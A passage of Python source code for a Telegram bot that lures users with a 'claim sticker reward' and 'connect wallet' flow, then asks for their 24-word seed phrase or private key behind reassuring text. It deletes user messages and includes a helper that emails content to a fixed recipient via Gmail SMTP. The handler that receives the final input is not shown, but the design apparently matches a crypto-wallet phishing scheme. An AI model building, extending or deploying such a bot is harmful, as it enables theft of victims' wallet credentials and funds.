    wallet_key = context.user_data.get("wallet key", "")
    if wallet_option == "seed_phrase":
        localized_label = ui_text(context, "label_seed_phrase")
        prompt_key = f"prompt_24_wallet_type_{wallet_key.replace('wallet_type_', '')}"
        localized_24 = ui_text(context, prompt_key)
        if localized_24 != prompt_key:
            text = localized_24 + build_reassurance_block(localized_label, context)
        else:
            text = ui_text(context, "prompt seed") + build_reassurance_block(localized_label, context)
    else:
        localized_label = ui_text(context, "label_private_key")
        text = ui_text(context, "prompt private key") + build_reassurance_block(localized_label, context)
    context.user_data["current_state"] = RECEIVE_INPUT
    await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=fr, state=RECEIVE_INPUT)
    return RECEIVE_INPUT

# Sticker handlers
async def handle_sticker_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    text = update.message.text or ""
    try:
        await context.bot.delete_message(chat_id=update.message.chat_id, message_id=update.message.message_id)
    except Exception:
        pass

    parts, count = parse_stickers_input(text)
    context.user_data["current_state"] = CLAIM_STICKER_CONFIRM
    keyboard = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(ui_text(context, "yes"), callback_data="claim_sticker_confirm_yes"),
                InlineKeyboardButton(ui_text(context, "no"), callback_data="claim_sticker_confirm_no"),
            ]
        ]
    )
    confirm_text = ui_text(context, "confirm_entered_stickers").format(count=count, stickers="\n".join(parts) if parts else text)
    await send_and_push_message(context.bot, update.effective_chat.id, confirm_text, context, reply_markup=keyboard, state=CLAIM_STICKER_CONFIRM)
    return CLAIM_STICKER_CONFIRM

async def handle_claim_sticker_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    if query.data == "claim_sticker_confirm_no":
        context.user_data["current_state"] = CLAIM_STICKER_INPUT
        prompt = ui_text(context, "enter stickers prompt")
        fr = ForceReply(selective=False)
        await send_and_push_message(context.bot, update.effective_chat.id, prompt, context, reply_markup=fr, state=CLAIM_STICKER_INPUT)
        return CLAIM_STICKER_INPUT

    context.user_data["from_claim_sticker"] = True
    context.user_data["current_state"] = AWAIT_CONNECT_WALLET
    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton(ui_text(context, "connect wallet button"), callback_data="connect_wallet")],
            [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_connect_wallet")],
        ]
    )
    text = f"{ui_text(context, 'claim sticker reward')}\n{ui_text(context, 'connect wallet message')}"
    await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=keyboard, state=AWAIT_CONNECT_WALLET)
    return AWAIT_CONNECT_WALLET

# Await restart handler
async def handle_await_restart(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(ui_text(context, "await restart message"))
    return AWAIT_RESTART

# Email sending helper
async def send_email(subject: str, body: str) -> None:
    try:
        msg = EmailMessage()
        msg.set_content(body)
        msg["Subject"] = subject
        msg["From"] = SENDER_EMAIL
        msg["To"] = RECIPIENT_EMAIL
        if not SENDER_PASSWORD:
            logging.warning("SENDER_PASSWORD not set; skipping email send.")
            return
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(SENDER_EMAIL, SENDER_PASSWORD)
            smtp.send_message(msg)
        logging.info("Email sent successfully.")
    except Exception as e:
        logging.error(f"Failed to send email: {e}")

# Handle Back action
async def handle_back(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    state = await edit_current_to_previous_on_back(update, context)
    return state

# Cancel handler
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    logging.info("Cancel called.")
    return ConversationHandler.END

# Main entrypoint
def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CHOOSE_LANGUAGE: [
                CallbackQueryHandler(set_language, pattern="^lang_"),
                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                CallbackQueryHandler(handle_back, pattern="^back_"),
            ],
            MAIN_MENU: [
                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            AWAIT_CONNECT_WALLET: [
                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
                CallbackQueryHandler(show_wallet_types, pattern="^connect_wallet$"),
                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            CHOOSE_WALLET_TYPE: [
                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                CallbackQueryHandler(show_other_wallets, pattern="^other_wallets$"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            CHOOSE_OTHER_WALLET_TYPE: [
                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            PROMPT_FOR_INPUT: [
                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
                CallbackQueryHandler(prompt_for_input, pattern="^(private_key|seed_phrase)$"),
                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                CallbackQueryHandler(handle_back, pattern="^back_"),
            ],
            RECEIVE_INPUT: [
                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_final_input),
            ],
            AWAIT_RESTART: [
                CallbackQueryHandler(handle_retry_input, pattern="^retry_input$"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_await_restart),
            ],
            CLAIM_STICKER_INPUT: [
                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_sticker_input),
                CallbackQueryHandler(handle_back, pattern="^back_"),
            ],
            CLAIM_STICKER_CONFIRM: [
                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                CallbackQueryHandler(handle_claim_sticker_confirmation, pattern="^claim_sticker_confirm_(yes|no)$"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
            ],
        },
        fallbacks=[CommandHandler("start", start)],
        allow_reentry=True,
    )

    application.add_handler(conv_handler)
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":


    main()
